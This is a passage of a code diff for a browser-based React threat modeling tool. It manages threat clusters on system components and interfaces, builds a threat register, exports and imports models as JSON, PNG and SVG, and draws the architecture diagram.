+            threats: [...iface.threats, { clusterId, applicable: true, status: 'Identified', velocityClass: 'VC-2', controls: [], notes: '', residualRisk: 'Medium', controlRef: '' }]
+          };
+        }));
+      };
+
+      const removeThreatFromInterface = (interfaceId, clusterId) => {
+        setInterfaces(interfaces.map(iface => {
+          if (iface.id !== interfaceId) return iface;
+          return { ...iface, threats: iface.threats.filter(t => t.clusterId !== clusterId) };
+        }));
+      };
+
+      // Threat management for components
+      const updateComponentThreat = (componentId, clusterId, updates) => {
+        setComponents(components.map(comp => {
+          if (comp.id !== componentId) return comp;
+          const updatedThreats = (comp.threats || []).map(t => t.clusterId === clusterId ? { ...t, ...updates } : t);
+          return { ...comp, threats: updatedThreats };
+        }));
+        if (selectedElement?.type === 'component' && selectedElement.data.id === componentId) {
+          setSelectedElement(prev => ({
+            ...prev,
+            data: {
+              ...prev.data,
+              threats: (prev.data.threats || []).map(t => t.clusterId === clusterId ? { ...t, ...updates } : t)
+            }
+          }));
+        }
+      };
+
+      const addThreatToComponent = (componentId, clusterId) => {
+        setComponents(components.map(comp => {
+          if (comp.id !== componentId || (comp.threats || []).find(t => t.clusterId === clusterId)) return comp;
+          return {
+            ...comp,
+            threats: [...(comp.threats || []), { clusterId, applicable: true, status: 'Identified', velocityClass: 'VC-2', controls: [], notes: '', residualRisk: 'Medium', controlRef: '' }]
+          };
+        }));
+      };
+
+      const removeThreatFromComponent = (componentId, clusterId) => {
+        setComponents(components.map(comp => {
+          if (comp.id !== componentId) return comp;
+          return { ...comp, threats: (comp.threats || []).filter(t => t.clusterId !== clusterId) };
+        }));
+      };
+
+      // Generate threat register (includes both component and interface threats)
+      const generateThreatRegister = () => {
+        const register = [];
+        
+        // Component threats
+        components.forEach(comp => {
+          const group = groups.find(g => g.id === comp.groupId);
+          (comp.threats || []).filter(t => t.applicable).forEach(threat => {
+            register.push({
+              elementType: 'component',
+              componentId: comp.id,
+              componentName: comp.name,
+              componentType: comp.type,
+              group: group?.name || null,
+              cluster: threat.clusterId,
+              clusterName: TLCTC_CLUSTERS[threat.clusterId]?.name,
+              status: threat.status,
+              velocityClass: threat.velocityClass,
+              residualRisk: threat.residualRisk,
+              notes: threat.notes,
+              controlRef: threat.controlRef || '',
+              isNetworkInterface: false
+            });
+          });
+        });
+        
+        // Interface threats
+        interfaces.forEach(iface => {
+          const fromComp = components.find(c => c.id === iface.fromId);
+          const toComp = components.find(c => c.id === iface.toId);
+          
+          iface.threats.filter(t => t.applicable).forEach(threat => {
+            register.push({
+              elementType: 'interface',
+              interfaceId: iface.id,
+              interfaceName: iface.name,
+              interfaceType: iface.interfaceType,
+              fromComponent: fromComp?.name,
+              toComponent: toComp?.name,
+              fromGroup: iface.sourceGroup,
+              toGroup: iface.targetGroup,
+              protocol: iface.protocol,
+              cluster: threat.clusterId,
+              clusterName: TLCTC_CLUSTERS[threat.clusterId]?.name,
+              status: threat.status,
+              velocityClass: threat.velocityClass,
+              residualRisk: threat.residualRisk,
+              notes: threat.notes,
+              controlRef: threat.controlRef || '',
+              isNetworkInterface: iface.interfaceType === 'network'
+            });
+          });
+        });
+        return register;
+      };
+
+      // Export functions
+      const exportJSON = () => {
+        const data = {
+          $schema: 'tlctc-threat-identification-v2',
+          tlctc_version: '2.0',
+          metadata: { ...projectMeta, exported: new Date().toISOString() },
+          system_model: {
+            groups: groups.map(g => ({ id: g.id, name: g.name, type: g.type, position: { x: g.x, y: g.y }, size: { width: g.width, height: g.height }, metadata: g.metadata })),
+            components: components.map(c => ({ 
+              id: c.id, type: c.type, name: c.name, layer: c.layer, groupId: c.groupId, position: { x: c.x, y: c.y }, metadata: c.metadata,
+              threats: (c.threats || []).map(t => ({ 
+                cluster: { strategic: t.clusterId, operational: `TLCTC-${t.clusterId.replace('#','').padStart(2,'0')}.00` }, 
+                applicable: t.applicable, status: t.status, velocity_class: t.velocityClass, residual_risk: t.residualRisk, notes: t.notes,
+                control_ref: t.controlRef || ''
+              }))
+            })),
+            interfaces: interfaces.map(i => ({
+              id: i.id, name: i.name, type: i.interfaceType, from: i.fromId, to: i.toId, protocol: i.protocol, port: i.port,
+              threats: i.threats.map(t => ({ 
+                cluster: { strategic: t.clusterId, operational: `TLCTC-${t.clusterId.replace('#','').padStart(2,'0')}.00` }, 
+                applicable: t.applicable, status: t.status, velocity_class: t.velocityClass, residual_risk: t.residualRisk, notes: t.notes,
+                control_ref: t.controlRef || ''
+              }))
+            }))
+          },
+          threat_register: generateThreatRegister()
+        };
+
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `${projectMeta.name.replace(/\s+/g, '-').toLowerCase()}-threat-model.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        setShowExport(false);
+      };
+
+      const exportPNG = useCallback(() => {
+        if (!canvasRef.current) return;
+        
+        const svg = canvasRef.current;
+        const clonedSvg = svg.cloneNode(true);
+        
+        const width = 1600;
+        const height = 1000;
+        clonedSvg.setAttribute('width', width);
+        clonedSvg.setAttribute('height', height);
+        clonedSvg.setAttribute('viewBox', `0 0 ${width} ${height}`);
+        
+        // Add title
+        const titleGroup = document.createElementNS('http://www.w3.org/2000/svg', 'g');
+        const titleBg = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+        titleBg.setAttribute('x', '0'); titleBg.setAttribute('y', '0');
+        titleBg.setAttribute('width', width); titleBg.setAttribute('height', '60');
+        titleBg.setAttribute('fill', '#1e293b');
+        titleGroup.appendChild(titleBg);
+        
+        const titleText = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+        titleText.setAttribute('x', '20'); titleText.setAttribute('y', '30');
+        titleText.setAttribute('fill', '#f8fafc'); titleText.setAttribute('font-size', '20');
+        titleText.setAttribute('font-weight', 'bold'); titleText.setAttribute('font-family', 'system-ui');
+        titleText.textContent = projectMeta.name;
+        titleGroup.appendChild(titleText);
+        
+        const subtitleText = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+        subtitleText.setAttribute('x', '20'); subtitleText.setAttribute('y', '48');
+        subtitleText.setAttribute('fill', '#94a3b8'); subtitleText.setAttribute('font-size', '12');
+        subtitleText.textContent = `v${projectMeta.version} | ${projectMeta.sdlcPhase} | TLCTC v2.0 | ${new Date().toLocaleDateString()}`;
+        titleGroup.appendChild(subtitleText);
+        
+        clonedSvg.insertBefore(titleGroup, clonedSvg.firstChild);
+        
+        // Add legend
+        const legendGroup = document.createElementNS('http://www.w3.org/2000/svg', 'g');
+        legendGroup.setAttribute('transform', `translate(10, ${height - 50})`);
+        
+        const legendBg = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+        legendBg.setAttribute('width', '650'); legendBg.setAttribute('height', '40');
+        legendBg.setAttribute('fill', '#1e293b'); legendBg.setAttribute('rx', '4');
+        legendGroup.appendChild(legendBg);
+        
+        let lx = 10;
+        Object.values(TLCTC_CLUSTERS).forEach((c) => {
+          const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+          circle.setAttribute('cx', lx + 6); circle.setAttribute('cy', '20');
+          circle.setAttribute('r', '5'); circle.setAttribute('fill', c.color);
+          legendGroup.appendChild(circle);
+          
+          const label = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+          label.setAttribute('x', lx + 14); label.setAttribute('y', '24');
+          label.setAttribute('fill', '#e2e8f0'); label.setAttribute('font-size', '9');
+          label.textContent = `${c.id}`;
+          legendGroup.appendChild(label);
+          lx += 60;
+        });
+        
+        clonedSvg.appendChild(legendGroup);
+        
+        const svgData = new XMLSerializer().serializeToString(clonedSvg);
+        const canvas = document.createElement('canvas');
+        const scale = 2;
+        canvas.width = width * scale;
+        canvas.height = height * scale;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#0f172a';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.scale(scale, scale);
+        
+        const img = new Image();
+        const svgBlob = new Blob([svgData], { type: 'image/svg+xml;charset=utf-8' });
+        const url = URL.createObjectURL(svgBlob);
+        
+        img.onload = () => {
+          ctx.drawImage(img, 0, 0, width, height);
+          URL.revokeObjectURL(url);
+          const pngUrl = canvas.toDataURL('image/png');
+          const a = document.createElement('a');
+          a.href = pngUrl;
+          a.download = `${projectMeta.name.replace(/\s+/g, '-').toLowerCase()}-threat-model.png`;
+          a.click();
+        };
+        
+        img.onerror = () => { URL.revokeObjectURL(url); alert('PNG export failed, try SVG instead.'); };
+        img.src = url;
+        setShowExport(false);
+      }, [groups, components, interfaces, projectMeta]);
+
+      const exportSVG = useCallback(() => {
+        if (!canvasRef.current) return;
+        const svg = canvasRef.current;
+        const clonedSvg = svg.cloneNode(true);
+        clonedSvg.setAttribute('width', '1600');
+        clonedSvg.setAttribute('height', '1000');
+        clonedSvg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
+        
+        const bg = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+        bg.setAttribute('width', '100%'); bg.setAttribute('height', '100%'); bg.setAttribute('fill', '#0f172a');
+        clonedSvg.insertBefore(bg, clonedSvg.firstChild);
+        
+        const svgData = new XMLSerializer().serializeToString(clonedSvg);
+        const blob = new Blob([svgData], { type: 'image/svg+xml' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `${projectMeta.name.replace(/\s+/g, '-').toLowerCase()}-threat-model.svg`;
+        a.click();
+        URL.revokeObjectURL(url);
+        setShowExport(false);
+      }, [projectMeta]);
+
+      // Import
+      const importProject = (e) => {
+        const file = e.target.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (event) => {
+          try {
+            const data = JSON.parse(event.target.result);
+            if (data.system_model) {
+              setGroups(
+                (data.system_model.groups || []).map(g => ({
+                  ...g,
+                  x: g.position?.x ?? g.x ?? 0,
+                  y: g.position?.y ?? g.y ?? 0,
+                  width: g.size?.width ?? g.width ?? 500,
+                  height: g.size?.height ?? g.height ?? 300
+                }))
+              );
+              setComponents(
+                (data.system_model.components || []).map(c => {
+                  const typeInfo = COMPONENT_TYPES.find(ct => ct.id === c.type);
+                  return {
+                    ...c,
+                    x: c.position?.x ?? c.x ?? 0,
+                    y: c.position?.y ?? c.y ?? 0,
+                    icon: c.icon ?? typeInfo?.icon ?? '⬛',
+                    threats: (c.threats || []).map(t => ({
+                      clusterId: t.cluster?.strategic ?? t.clusterId ?? null,
+                      applicable: t.applicable ?? true,
+                      status: t.status ?? 'Identified',
+                      velocityClass: t.velocity_class ?? t.velocityClass ?? 'VC-2',
+                      residualRisk: t.residual_risk ?? t.residualRisk ?? 'Medium',
+                      notes: t.notes ?? '',
+                      controlRef: t.control_ref ?? t.controlRef ?? '',
+                      controls: t.controls ?? []
+                    })).filter(t => t.clusterId)
+                  };
+                })
+              );
+              setInterfaces(
+                (data.system_model.interfaces || []).map(i => ({
+                  ...i,
+                  fromId: i.fromId ?? i.from,
+                  toId: i.toId ?? i.to,
+                  interfaceType: i.interfaceType ?? i.type,
+                  clientComponentId: i.clientComponentId ?? null,
+                  serverComponentId: i.serverComponentId ?? null,
+                  roleConfidence: i.roleConfidence ?? null,
+                  crossesTrustBoundary: i.crossesTrustBoundary ?? false,
+                  threats: (i.threats || []).map(t => ({
+                    clusterId: t.cluster?.strategic ?? t.clusterId ?? null,
+                    applicable: t.applicable ?? true,
+                    status: t.status ?? 'Identified',
+                    velocityClass: t.velocity_class ?? t.velocityClass ?? 'VC-2',
+                    residualRisk: t.residual_risk ?? t.residualRisk ?? 'Medium',
+                    notes: t.notes ?? '',
+                    controlRef: t.control_ref ?? t.controlRef ?? '',
+                    controls: t.controls ?? []
+                  })).filter(t => t.clusterId)
+                }))
+              );
+            }
+            if (data.metadata) setProjectMeta(prev => ({ ...prev, ...data.metadata }));
+          } catch (err) { alert('Import failed'); }
+        };
+        reader.readAsText(file);
+        e.target.value = '';
+      };
+
+      const clearAll = () => {
+        if (confirm('Clear entire model?')) {
+          setGroups([]); setComponents([]); setInterfaces([]); setSelectedElement(null);
+          setPendingSuggestions([]);
+        }
+      };
+
+      const loadTemplate = (templateId) => {
+        const tmpl = EXAMPLE_TEMPLATES.find(t => t.id === templateId);
+        if (!tmpl) return;
+        if (components.length > 0 && !confirm(`Load "${tmpl.name}"? This will replace your current model.`)) return;
+
+        // Build groups
+        const refToGroupId = {};
+        const newGroups = tmpl.groups.map(g => {
+          const id = generateId();
+          refToGroupId[g.ref] = id;
+          return { id, name: g.name, type: g.type, icon: g.type === 'group-container' ? '📦' : g.type === 'group-pod' ? '☸️' : '🖥️',
+            x: g.x, y: g.y, width: g.w, height: g.h,
+            metadata: { version: '', owner: g.owner || '@Org', isThirdParty: g.thirdParty || false, description: '', environment: 'Production' }
+          };
+        });
+
+        // Build components with default threats from COMPONENT_TYPES
+        const refToCompId = {};
+        const newComponents = tmpl.components.map(c => {
+          const id = generateId();
+          refToCompId[c.ref] = id;
+          const typeInfo = COMPONENT_TYPES.find(ct => ct.id === c.type);
+          const defaultThreats = (typeInfo?.defaultThreats || []).map(clusterId => ({
+            clusterId, applicable: true, status: 'Identified', velocityClass: 'VC-2', controls: [], notes: '', residualRisk: 'Medium', controlRef: ''
+          }));
+          return { id, type: c.type, name: c.name, icon: typeInfo?.icon || '⬛',
+            groupId: c.group ? refToGroupId[c.group] : null,
+            x: c.x, y: c.y, layer: typeInfo?.layer || 'application',
+            metadata: { version: '', owner: c.owner || '@Org', isThirdParty: c.thirdParty || typeInfo?.isThirdParty || false, criticality: 'Medium', description: '', sbom: '' },
+            threats: defaultThreats
+          };
+        });
+
+        // Build interfaces with smart client-server mapping
+        const suggestions = [];
+        const newInterfaces = tmpl.interfaces.map(iface => {
+          const fromId = refToCompId[iface.from];
+          const toId = refToCompId[iface.to];
+          const fromComp = newComponents.find(c => c.id === fromId);
+          const toComp = newComponents.find(c => c.id === toId);
+          if (!fromComp || !toComp) return null;
+
+          const isNetworkInterface = fromComp.groupId !== toComp.groupId;
+          const roles = resolveClientServerRoles(fromComp, toComp);
+          const crossesTrustBoundary = fromComp.metadata.owner !== toComp.metadata.owner || fromComp.metadata.isThirdParty !== toComp.metadata.isThirdParty;
+          const authTypes = ['auth-module', 'auth-library', 'idp'];
+          const involvesAuth = authTypes.includes(fromComp.type) || authTypes.includes(toComp.type);
+
+          const interfaceThreats = [];
+          if (isNetworkInterface) interfaceThreats.push({ clusterId: '#5', applicable: true, status: 'Identified', velocityClass: 'VC-4', controls: [], notes: `Network: ${fromComp.name} \u2194 ${toComp.name}`, residualRisk: 'Medium', controlRef: '' });
+          if (involvesAuth || isNetworkInterface) interfaceThreats.push({ clusterId: '#4', applicable: true, status: 'Identified', velocityClass: 'VC-3', controls: [], notes: `Auth flow: ${roles.client.name} \u2192 ${roles.server.name}`, residualRisk: 'Medium', controlRef: '' });
+          if (crossesTrustBoundary) interfaceThreats.push({ clusterId: '#10', applicable: true, status: 'Identified', velocityClass: 'VC-1', controls: [], notes: `Trust boundary: ${fromComp.metadata.owner} \u2192 ${toComp.metadata.owner}`, residualRisk: 'Medium', controlRef: '' });
+
+          // Suggest #2 for server, #3 for client
+          if (!roles.server.threats.find(t => t.clusterId === '#2')) suggestions.push({ id: generateId(), componentId: roles.server.id, componentName: roles.server.name, clusterId: '#2', reason: `Server-side of interface (receives from ${roles.client.name})` });
+          if (!roles.client.threats.find(t => t.clusterId === '#3')) suggestions.push({ id: generateId(), componentId: roles.client.id, componentName: roles.client.name, clusterId: '#3', reason: `Client-side of interface (processes from ${roles.server.name})` });
+
+          const fromGroup = newGroups.find(g => g.id === fromComp.groupId);
+          const toGroup = newGroups.find(g => g.id === toComp.groupId);
+          return {
+            id: generateId(), fromId, toId, name: `${fromComp.name} \u2192 ${toComp.name}`,
+            interfaceType: isNetworkInterface ? 'network' : 'internal',
+            protocol: iface.protocol || (isNetworkInterface ? 'HTTPS' : 'Internal Call'),
+            port: iface.port || (isNetworkInterface ? '443' : '-'),
+            dataClassification: 'Internal', authMethod: involvesAuth ? 'OAuth/Token' : 'None',
+            clientComponentId: roles.client.id, serverComponentId: roles.server.id,
+            roleConfidence: roles.confidence, crossesTrustBoundary,
+            threats: interfaceThreats,
+            sourceSphere: fromComp.metadata.owner, targetSphere: toComp.metadata.owner,
+            sourceGroup: fromGroup?.name || null, targetGroup: toGroup?.name || null
+          };
+        }).filter(Boolean);
+
+        // Deduplicate suggestions
+        const seenSugs = new Set();
+        const uniqueSugs = suggestions.filter(s => { const key = `${s.componentId}-${s.clusterId}`; if (seenSugs.has(key)) return false; seenSugs.add(key); return true; });
+
+        setGroups(newGroups);
+        setComponents(newComponents);
+        setInterfaces(newInterfaces);
+        setSelectedElement(null);
+        setPendingSuggestions(uniqueSugs);
+        setProjectMeta(prev => ({ ...prev, ...tmpl.meta, modified: new Date().toISOString() }));
+      };
+
+      // Cluster counts (includes both component and interface threats)
+      const clusterCounts = Object.keys(TLCTC_CLUSTERS).reduce((acc, id) => {
+        const componentThreats = components.reduce((sum, c) => sum + (c.threats || []).filter(t => t.clusterId === id && t.applicable).length, 0);
+        const interfaceThreats = interfaces.reduce((sum, i) => sum + i.threats.filter(t => t.clusterId === id && t.applicable).length, 0);
+        acc[id] = componentThreats + interfaceThreats;
+        return acc;
+      }, {});
+
+      const getFilteredComponents = () => activeTab === 'all' ? COMPONENT_TYPES : COMPONENT_TYPES.filter(c => c.layer === activeTab);
+
+      return (
+        <div className={`flex flex-col h-screen ${darkMode ? 'bg-slate-900 text-slate-100' : 'bg-slate-50 text-slate-900'}`}>
+          {/* Header */}
+          <header className={`${darkMode ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'} border-b px-4 py-2 flex items-center justify-between flex-shrink-0`}>
+            <div className="flex items-center gap-3">
+              <span className="text-amber-500"><Icons.Target /></span>
+              <div>
+                <h1 className="font-bold">TLCTC Threat Identification Tool</h1>
+                <p className={`text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'}`}>SDLC Threat Modeling · v2.0 <a href="/"> --> TLCTC.net</a>
+                  </p>
+
+              </div>
+              <select onChange={(e) => { if (e.target.value) { loadTemplate(e.target.value); e.target.value = ''; } }}
+                className={`${darkMode ? 'bg-slate-700 border-slate-600 text-slate-300 hover:bg-slate-600' : 'bg-slate-100 border-slate-300 text-slate-700 hover:bg-slate-200'} border rounded px-2 py-1 text-xs cursor-pointer`}>
+                <option value="">Load Example Template...</option>
+                {EXAMPLE_TEMPLATES.map(t => <option key={t.id} value={t.id}>{t.icon} {t.name}</option>)}
+              </select>
+            </div>
+            <div className="flex items-center gap-2">
+
+              <button onClick={() => setShowThreatRegister(true)} className="flex items-center gap-2 px-3 py-1.5 bg-amber-600 hover:bg-amber-500 rounded text-sm font-medium text-white">
+                <Icons.FileJson /> Threat Register
+              </button>
+              <button onClick={() => setShowSettings(true)} className={`p-2 ${darkMode ? 'hover:bg-slate-700' : 'hover:bg-slate-200'} rounded`}><Icons.Settings /></button>
+              <label className={`p-2 ${darkMode ? 'hover:bg-slate-700' : 'hover:bg-slate-200'} rounded cursor-pointer`}>
+                <Icons.Upload /><input type="file" accept=".json" onChange={importProject} className="hidden" />
+              </label>
+              <button onClick={() => setShowExport(true)} className={`p-2 ${darkMode ? 'hover:bg-slate-700' : 'hover:bg-slate-200'} rounded`}><Icons.Download /></button>
+              <button onClick={clearAll} className={`p-2 ${darkMode ? 'hover:bg-red-900/50 text-red-400' : 'hover:bg-red-100 text-red-500'} rounded`}><Icons.Trash /></button>
+              <div className={`h-5 w-px mx-1 ${darkMode ? 'bg-slate-700' : 'bg-slate-200'}`}></div>
+              <button onClick={() => setDarkMode(!darkMode)} className={`p-2 ${darkMode ? 'hover:bg-slate-700' : 'hover:bg-slate-200'} rounded`} title="Toggle theme">
+                {darkMode ? <Icons.Sun /> : <Icons.Moon />}
+              </button>
+            </div>
+          </header>
+
+          <div className="flex flex-1 overflow-hidden">
+            {/* Left Panel */}
+            <aside className={`w-56 ${darkMode ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'} border-r flex flex-col overflow-hidden flex-shrink-0`}>
+              <div className={`p-2 border-b ${darkMode ? 'border-slate-700' : 'border-slate-200'}`}>
+                <div className="text-xs text-slate-500 uppercase font-medium mb-2">Deployment Groups</div>
+                {GROUP_TYPES.map(item => (
+                  <div key={item.id} draggable onDragStart={(e) => handleDragStart(e, item, 'group')}
+                    className={`flex items-center gap-2 p-1.5 rounded cursor-grab ${darkMode ? 'hover:bg-slate-700 border-slate-600' : 'hover:bg-slate-100 border-slate-300'} border border-dashed mb-1`}>
+                    <span>{item.icon}</span>
+                    <span className="text-sm">{item.name}</span>
+                  </div>
+                ))}
+              </div>
+
+              <div className={`p-2 border-b ${darkMode ? 'border-slate-700' : 'border-slate-200'}`}>
+                <div className="text-xs text-slate-500 uppercase font-medium mb-1">Components</div>
+                <div className="flex flex-wrap gap-1">
+                  {['all', 'application', 'library', 'external'].map(tab => (
+                    <button key={tab} onClick={() => setActiveTab(tab)}
+                      className={`px-2 py-0.5 text-xs rounded ${activeTab === tab ? (darkMode ? 'bg-slate-600' : 'bg-slate-300') : (darkMode ? 'bg-slate-700 hover:bg-slate-600' : 'bg-slate-100 hover:bg-slate-200')}`}>
+                      {tab === 'all' ? 'All' : tab.charAt(0).toUpperCase() + tab.slice(1, 4)}
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              <div className="flex-1 overflow-y-auto p-2 space-y-1">
+                {getFilteredComponents().map(item => (
+                  <div key={item.id} draggable onDragStart={(e) => handleDragStart(e, item, 'component')}
+                    className={`flex items-center gap-2 p-1.5 rounded cursor-grab ${darkMode ? 'hover:bg-slate-700' : 'hover:bg-slate-100'} ${item.isThirdParty ? 'border-l-2 border-amber-500' : ''}`}>
+                    <span>{item.icon}</span>
+                    <span className="text-sm truncate flex-1">{item.name}</span>
+                    {item.isThirdParty && <span className="text-xs text-amber-500">3P</span>}
+                  </div>
+                ))}
+              </div>
+            </aside>
+
+            {/* Canvas */}
+            <main className="flex-1 flex flex-col overflow-hidden">
+              <div className={`${darkMode ? 'bg-slate-800/50 border-slate-700' : 'bg-slate-100/50 border-slate-200'} border-b px-4 py-2 flex items-center gap-4 flex-shrink-0`}>
+                <button onClick={() => setConnectionMode(connectionMode ? null : { from: null })}
+                  className={`flex items-center gap-2 px-3 py-1.5 rounded text-sm ${connectionMode ? 'bg-green-600 text-white' : (darkMode ? 'bg-slate-700 hover:bg-slate-600' : 'bg-slate-200 hover:bg-slate-300')}`}>
+                  <Icons.Link />
+                  {connectionMode ? (connectionMode.from ? 'Select Target...' : 'Select Source...') : 'Create Interface'}
+                </button>
+                {connectionMode && <button onClick={() => setConnectionMode(null)} className={`text-sm ${darkMode ? 'text-slate-400 hover:text-white' : 'text-slate-500 hover:text-slate-900'}`}>Cancel</button>}
+                <div className="flex-1" />
+                <div className="text-xs text-slate-500">{groups.length} groups · {components.length} components · {interfaces.length} interfaces</div>
+              </div>
+
+              <div className={`flex-1 relative overflow-auto ${darkMode ? 'bg-slate-900/50' : 'bg-slate-50'}`}>
+                <svg ref={canvasRef} className="w-full h-full" style={{minWidth: '1400px', minHeight: '900px'}}
+                  onDragOver={(e) => e.preventDefault()} onDrop={handleCanvasDrop}
+                  onClick={() => !connectionMode && setSelectedElement(null)}>
+                  <defs>
+                    <pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse">
+                      <path d="M 20 0 L 0 0 0 20" fill="none" stroke={darkMode ? '#1e293b' : '#e2e8f0'} strokeWidth="0.5" />
+                    </pattern>
+                    <marker id="arrow" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
+                      <polygon points="0 0, 8 3, 0 6" fill="#64748b" />
+                    </marker>
+                    <marker id="arrow-sel" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
+                      <polygon points="0 0, 8 3, 0 6" fill="#3b82f6" />
+                    </marker>
+                    <marker id="arrow-warn" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
+                      <polygon points="0 0, 8 3, 0 6" fill="#f59e0b" />
+                    </marker>
+                    <filter id="glow-blue" x="-30%" y="-30%" width="160%" height="160%">
+                      <feGaussianBlur stdDeviation="3" result="blur" />
+                      <feFlood floodColor="#3b82f6" floodOpacity="0.4" result="color" />
+                      <feComposite in="color" in2="blur" operator="in" result="glow" />
+                      <feMerge><feMergeNode in="glow" /><feMergeNode in="SourceGraphic" /></feMerge>
+                    </filter>
+                  </defs>
+                  <rect width="100%" height="100%" fill="url(#grid)" />
+
+                  {/* Groups */}
+                  {groups.map(group => {
+                    const isSelected = selectedElement?.type === 'group' && selectedElement.data.id === group.id;
+                    return (
+                      <g key={group.id}>
+                        <rect x={group.x} y={group.y} width={group.width} height={group.height} rx="8"
+                          fill={darkMode ? '#0f172a' : '#f8fafc'} stroke={isSelected ? '#3b82f6' : (darkMode ? '#334155' : '#cbd5e1')}
+                          strokeWidth={isSelected ? 2 : 1} strokeDasharray="4,2" className="cursor-move"
+                          onClick={(e) => { e.stopPropagation(); handleElementClick(group, 'group'); }}
+                          onMouseDown={(e) => {
+                            if (e.button !== 0) return;
+                            const move = (ev) => handleElementDrag(ev, group.id, 'group');
+                            const up = () => { document.removeEventListener('mousemove', move); document.removeEventListener('mouseup', up); };
+                            document.addEventListener('mousemove', move); document.addEventListener('mouseup', up);
+                          }}
+                        />
+                        <rect x={group.x} y={group.y} width={group.width} height="24" rx="8" fill={darkMode ? '#1e293b' : '#e2e8f0'} className="pointer-events-none" />
+                        <text x={group.x + 10} y={group.y + 16} fill={darkMode ? '#94a3b8' : '#475569'} fontSize="12" fontWeight="500" className="pointer-events-none">
+                          {group.icon} {group.name}
+                        </text>
+                        <text x={group.x + group.width - 10} y={group.y + 16} fill="#64748b" fontSize="10" textAnchor="end" className="pointer-events-none">
+                          {group.metadata.owner}
+                        </text>
+                        <rect x={group.x + group.width - 12} y={group.y + group.height - 12} width="10" height="10"
+                          fill={darkMode ? '#475569' : '#94a3b8'} rx="2" className="cursor-se-resize"
+                          onMouseDown={(e) => {
+                            e.stopPropagation();
+                            const move = (ev) => handleGroupResize(ev, group.id);
+                            const up = () => { document.removeEventListener('mousemove', move); document.removeEventListener('mouseup', up); };
+                            document.addEventListener('mousemove', move); document.addEventListener('mouseup', up);
+                          }}
+                        />
+                      </g>
+                    );
+                  })}
+
+                  {/* Interfaces */}
+                  {interfaces.map(iface => {
+                    const fromComp = components.find(c => c.id === iface.fromId);
+                    const toComp = components.find(c => c.id === iface.toId);
+                    if (!fromComp || !toComp) return null;
+
+                    const fromPos = getAbsolutePosition(fromComp);
+                    const toPos = getAbsolutePosition(toComp);
+                    const x1 = fromPos.x + 40, y1 = fromPos.y + 25;
+                    const x2 = toPos.x + 40, y2 = toPos.y + 25;
+                    
+                    const isSelected = selectedElement?.type === 'interface' && selectedElement.data.id === iface.id;
+                    const threatCount = iface.threats.filter(t => t.applicable && t.status === 'Identified').length;
+                    const isInternal = iface.interfaceType === 'internal';
+                    const matchesFilter = !filterCluster || iface.threats.some(t => t.clusterId === filterCluster && t.applicable);
+                    const midX = (x1 + x2) / 2, midY = (y1 + y2) / 2;
+
+                    return (
+                      <g key={iface.id} style={{ opacity: filterCluster && !matchesFilter ? 0.15 : 1 }}
+                        onClick={(e) => { e.stopPropagation(); handleElementClick(iface, 'interface'); }}>
+                        <line x1={x1} y1={y1} x2={x2} y2={y2}
+                          stroke={isSelected ? '#3b82f6' : threatCount > 0 ? '#f59e0b' : (darkMode ? '#475569' : '#94a3b8')}
+                          strokeWidth={isSelected ? 2.5 : 1.5}
+                          strokeDasharray={isInternal ? '4,4' : 'none'}
+                          markerEnd={isSelected ? 'url(#arrow-sel)' : threatCount > 0 ? 'url(#arrow-warn)' : 'url(#arrow)'}
+                          className="cursor-pointer"
+                        />
+                        {threatCount > 0 && (
+                          <g transform={`translate(${midX}, ${midY})`}>
+                            <circle r="10" fill="#f59e0b" />
+                            <text y="4" fill="white" fontSize="10" fontWeight="bold" textAnchor="middle">{threatCount}</text>
+                          </g>
+                        )}
+                        <text x={midX} y={midY - 14} fill="#64748b" fontSize="8" textAnchor="middle">{iface.protocol}</text>
+                        {/* Client→Server direction label */}
+                        {iface.clientComponentId && iface.serverComponentId && (() => {
+                          const clientComp = components.find(c => c.id === iface.clientComponentId);
+                          const serverComp = components.find(c => c.id === iface.serverComponentId);
+                          if (!clientComp || !serverComp) return null;
+                          const cPos = getAbsolutePosition(clientComp);
+                          const sPos = getAbsolutePosition(serverComp);
+                          const cx = cPos.x + 40, cy = cPos.y + 25;
+                          const sx = sPos.x + 40, sy = sPos.y + 25;
+                          const dx = sx - cx, dy = sy - cy;
+                          const len = Math.sqrt(dx * dx + dy * dy) || 1;
+                          const nx = -dy / len, ny = dx / len;
+                          const offsetDist = 14;
+                          const labelX = midX + nx * offsetDist;
+                          const labelY = midY + ny * offsetDist;
+                          const conf = iface.roleConfidence || 'low';
+                          const confColor = conf === 'high' ? '#22c55e' : conf === 'medium' ? '#eab308' : '#94a3b8';
+                          return (
+                            <g transform={`translate(${labelX}, ${labelY})`}>
+                              <rect x="-14" y="-6" width="28" height="12" rx="3" fill={darkMode ? '#1e293b' : '#f1f5f9'} stroke={confColor} strokeWidth="0.5" opacity="0.9" />
+                              <text y="3" fill={confColor} fontSize="7" fontWeight="600" textAnchor="middle">C→S</text>
+                            </g>
+                          );
+                        })()}
+                        {/* Trust Boundary badge */}
+                        {iface.crossesTrustBoundary && (() => {
+                          const dx2 = x2 - x1, dy2 = y2 - y1;
+                          const len2 = Math.sqrt(dx2 * dx2 + dy2 * dy2) || 1;
+                          const nx2 = -dy2 / len2, ny2 = dx2 / len2;
